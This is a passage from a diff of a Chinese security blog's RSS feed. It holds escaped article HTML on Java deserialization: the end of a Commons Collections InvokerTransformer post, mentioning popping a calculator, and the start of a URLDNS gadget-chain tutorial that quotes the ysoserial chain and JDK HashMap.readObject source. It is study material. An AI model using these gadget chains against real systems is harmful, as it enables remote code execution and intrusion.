+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		&lt;span style="color:#66d9ef"&gt;throw&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; FunctorException(&lt;span style="color:#e6db74"&gt;&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; iMethodName &lt;span style="color:#f92672"&gt;+&lt;/span&gt; 		&lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; input.&lt;span style="color:#a6e22e"&gt;getClass&lt;/span&gt;() &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#39; cannot be accessed&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	} &lt;span style="color:#66d9ef"&gt;catch&lt;/span&gt; (InvocationTargetException ex) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		&lt;span style="color:#66d9ef"&gt;throw&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; FunctorException(&lt;span style="color:#e6db74"&gt;&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; iMethodName &lt;span style="color:#f92672"&gt;+&lt;/span&gt; 		&lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; input.&lt;span style="color:#a6e22e"&gt;getClass&lt;/span&gt;() &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#39; threw an exception&amp;#34;&lt;/span&gt;, ex);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们可以利用这个类实现弹计算器。&lt;/p&gt;</description></item><item><title>java反序列化之URLDNS链</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/</link><pubDate>Tue, 21 Apr 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/</guid><description>&lt;h1 id="java反序列化之urldns链"&gt;
+ java反序列化之URLDNS链
+ &lt;a class="anchor" href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8burldns%e9%93%be"&gt;#&lt;/a&gt;
+&lt;/h1&gt;
+&lt;h2 id="java反序列化"&gt;
+ java反序列化
+ &lt;a class="anchor" href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;在 java 中，如果一个对象实现了 Serializable 接口就可以被序列化，java 的这种序列化模式为开发者提供了很多便利，我们可以不必关心具体序列化的过程，只要这个类实现了 Serilizable 接口，这个类的所有属性和方法都会自动序列化，transient 关键字修饰的属性除外，不参与序列化过程。&lt;/p&gt;
+&lt;h2 id="urldns链"&gt;
+ URLDNS链
+ &lt;a class="anchor" href="#urldns%e9%93%be"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;这条利用链有一下特点：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;不限制 jdk 版本，使用 java 内部类，对第三方依赖没用要求&lt;/li&gt;
+&lt;li&gt;目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞&lt;/li&gt;
+&lt;li&gt;URLDNS链只能发起 DNS 请求，并不能进行其他利用。虽然没有任何攻击性，但是在渗透测试的过程中能进行无回显验证&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在 ysoserial 中列出的调用链：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-md" data-lang="md"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;*&lt;/span&gt; Gadget Chain:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;*&lt;/span&gt; HashMap.readObject()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;*&lt;/span&gt; HashMap.putVal()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;*&lt;/span&gt; HashMap.hash()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;*&lt;/span&gt; URL.hashCode()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="原理"&gt;
+ 原理
+ &lt;a class="anchor" href="#%e5%8e%9f%e7%90%86"&gt;#&lt;/a&gt;
+&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;java.util.HashMap&lt;/code&gt;重写了&lt;code&gt;readObject&lt;/code&gt;方法，在反序列化时会调用&lt;code&gt;hash&lt;/code&gt;函数计算 key 的 hashCode。而&lt;code&gt;java.net.URL&lt;/code&gt;的 hashCode 在计算时会调用&lt;code&gt;getHostAddress&lt;/code&gt;来解析域名，从而发出 DNS 请求。&lt;/p&gt;
+&lt;p&gt;定位到 HashMap#readObject 方法：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;readObject&lt;/span&gt;(ObjectInputStream s)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;throws&lt;/span&gt; IOException, ClassNotFoundException {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ObjectInputStream.&lt;span style="color:#a6e22e"&gt;GetField&lt;/span&gt; fields &lt;span style="color:#f92672"&gt;=&lt;/span&gt; s.&lt;span style="color:#a6e22e"&gt;readFields&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// Read loadFactor (ignore threshold)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;float&lt;/span&gt; lf &lt;span style="color:#f92672"&gt;=&lt;/span&gt; fields.&lt;span style="color:#a6e22e"&gt;get&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;loadFactor&amp;#34;&lt;/span&gt;, 0.&lt;span style="color:#a6e22e"&gt;75f&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (lf &lt;span style="color:#f92672"&gt;&amp;lt;=&lt;/span&gt; 0 &lt;span style="color:#f92672"&gt;||&lt;/span&gt; Float.&lt;span style="color:#a6e22e"&gt;isNaN&lt;/span&gt;(lf))
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;throw&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; InvalidObjectException(&lt;span style="color:#e6db74"&gt;&amp;#34;Illegal load factor: &amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; lf);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; lf &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Math.&lt;span style="color:#a6e22e"&gt;clamp&lt;/span&gt;(lf, 0.&lt;span style="color:#a6e22e"&gt;25f&lt;/span&gt;, 4.&lt;span style="color:#a6e22e"&gt;0f&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; HashMap.&lt;span style="color:#a6e22e"&gt;UnsafeHolder&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;putLoadFactor&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;this&lt;/span&gt;, lf);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; reinitialize();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; s.&lt;span style="color:#a6e22e"&gt;readInt&lt;/span&gt;(); &lt;span style="color:#75715e"&gt;// Read and ignore number of buckets&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; mappings &lt;span style="color:#f92672"&gt;=&lt;/span&gt; s.&lt;span style="color:#a6e22e"&gt;readInt&lt;/span&gt;(); &lt;span style="color:#75715e"&gt;// Read number of mappings (size)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (mappings &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; 0) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;throw&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; InvalidObjectException(&lt;span style="color:#e6db74"&gt;&amp;#34;Illegal mappings count: &amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; mappings);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (mappings &lt;span style="color:#f92672"&gt;==&lt;/span&gt; 0) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// use defaults&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (mappings &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; 0) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;double&lt;/span&gt; dc &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Math.&lt;span style="color:#a6e22e"&gt;ceil&lt;/span&gt;(mappings &lt;span style="color:#f92672"&gt;/&lt;/span&gt; (&lt;span style="color:#66d9ef"&gt;double&lt;/span&gt;)lf);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; cap &lt;span style="color:#f92672"&gt;=&lt;/span&gt; ((dc &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; DEFAULT_INITIAL_CAPACITY) &lt;span style="color:#f92672"&gt;?&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; DEFAULT_INITIAL_CAPACITY :
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; (dc &lt;span style="color:#f92672"&gt;&amp;gt;=&lt;/span&gt; MAXIMUM_CAPACITY) &lt;span style="color:#f92672"&gt;?&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; MAXIMUM_CAPACITY :
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; tableSizeFor((&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt;)dc));
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;float&lt;/span&gt; ft &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#66d9ef"&gt;float&lt;/span&gt;)cap &lt;span style="color:#f92672"&gt;*&lt;/span&gt; lf;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; threshold &lt;span style="color:#f92672"&gt;=&lt;/span&gt; ((cap &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; MAXIMUM_CAPACITY &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ft &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; MAXIMUM_CAPACITY) &lt;span style="color:#f92672"&gt;?&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; (&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt;)ft : Integer.&lt;span style="color:#a6e22e"&gt;MAX_VALUE&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// Check Map.Entry[].class since it&amp;#39;s the nearest public type to&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// what we&amp;#39;re actually creating.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; SharedSecrets.&lt;span style="color:#a6e22e"&gt;getJavaObjectInputStreamAccess&lt;/span&gt;().&lt;span style="color:#a6e22e"&gt;checkArray&lt;/span&gt;(s, Map.&lt;span style="color:#a6e22e"&gt;Entry&lt;/span&gt;&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;class&lt;/span&gt;, cap);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@SuppressWarnings&lt;/span&gt;({&lt;span style="color:#e6db74"&gt;&amp;#34;rawtypes&amp;#34;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#34;unchecked&amp;#34;&lt;/span&gt;})
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Node&lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt;K,V&lt;span style="color:#f92672"&gt;&amp;gt;[]&lt;/span&gt; tab &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (Node&lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt;K,V&lt;span style="color:#f92672"&gt;&amp;gt;[]&lt;/span&gt;)&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Node&lt;span style="color:#f92672"&gt;[&lt;/span&gt;cap&lt;span style="color:#f92672"&gt;]&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; table &lt;span style="color:#f92672"&gt;=&lt;/span&gt; tab;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// Read the keys and values, and put the mappings in the HashMap&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; (&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; i &lt;span style="color:#f92672"&gt;=&lt;/span&gt; 0; i &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; mappings; i&lt;span style="color:#f92672"&gt;++&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@SuppressWarnings&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;unchecked&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; K key &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (K) s.&lt;span style="color:#a6e22e"&gt;readObject&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@SuppressWarnings&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;unchecked&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; V value &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (V) s.&lt;span style="color:#a6e22e"&gt;readObject&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; putVal(hash(key), key, value, &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;, &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里我们只需要关注&lt;code&gt;putVal&lt;/code&gt;方法，这是一个向 HashMap 中存放键值对的方法，这里调用了&lt;code&gt;hash&lt;/code&gt;方法来处理了 key，定位到&lt;code&gt;hash&lt;/code&gt;方法：&lt;/p&gt;</description></item></channel></rss>
